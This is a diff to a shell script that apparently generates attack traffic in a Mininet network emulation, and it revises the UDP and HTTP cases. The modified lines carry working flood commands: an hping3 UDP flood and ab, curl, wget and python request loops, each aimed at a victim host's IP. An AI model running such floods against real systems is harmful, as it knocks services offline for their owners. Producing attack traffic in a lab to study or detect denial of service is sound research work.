@@ -146,14 +146,16 @@ case "$ATTACK" in
   udp)
     check_tool hping3
     check_tool iperf3
-    dc_exec "mnexec -a $VICTIM_PID iperf3 -s -u &"
-    dc_exec "mnexec -a $ATTACKER_PID hping3 --udp -p 5001 --flood $VICTIM_IP >/tmp/auto_hping.log 2>&1 & sleep $DURATION; pkill hping3 || true; pkill iperf3 || true"
+    # iperf3 server no usa -u y por defecto va al 5201. Forzamos 5001 para coincidir con hping3.
+    dc_exec "mnexec -a $VICTIM_PID iperf3 -s -p 5001 >/dev/null 2>&1 &"
+    dc_exec "mnexec -a $ATTACKER_PID hping3 --udp -p 5001 --flood $VICTIM_IP >/tmp/auto_hping.log 2>&1 & sleep $DURATION; pkill hping3 || true; pkill -f iperf3 || true"
     ;;
   http)
-    dc_exec "mnexec -a $VICTIM_PID python3 -m http.server 80 &"
+    dc_exec "mnexec -a $VICTIM_PID python3 -m http.server 80 >/dev/null 2>&1 &"
     # try to use ab if available, otherwise wget loop
-    dc_exec "mnexec -a $ATTACKER_PID bash -lc 'if command -v ab >/dev/null 2>&1; then ab -n 10000 -c 50 http://$VICTIM_IP/ >/tmp/auto_ab.log 2>&1 & sleep $DURATION; pkill ab || true; else for i in \$(seq 1 1000); do wget -qO- http://$VICTIM_IP/ >/dev/null; done & sleep $DURATION; pkill wget || true; fi'"
-    dc_exec "mnexec -a $VICTIM_PID pkill python3 || true"
+    # Usamos timeout para el loop de wget y -t para ab
+    dc_exec "mnexec -a $ATTACKER_PID bash -lc 'if command -v ab >/dev/null 2>&1; then ab -t $DURATION -n 1000000 -c 50 http://$VICTIM_IP/ >/tmp/auto_ab.log 2>&1; elif command -v curl >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do curl -s http://$VICTIM_IP/ >/dev/null; done; elif command -v wget >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do wget -qO- http://$VICTIM_IP/ >/dev/null; done; else end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do python3 -c \"import urllib.request; urllib.request.urlopen('\''http://$VICTIM_IP/'\'')\" >/dev/null 2>&1; done; fi'"
+    dc_exec "mnexec -a $VICTIM_PID pkill -f http.server || true"
     ;;
   *) echo "Unknown attack '$ATTACK'"; exit 2;;
 esac
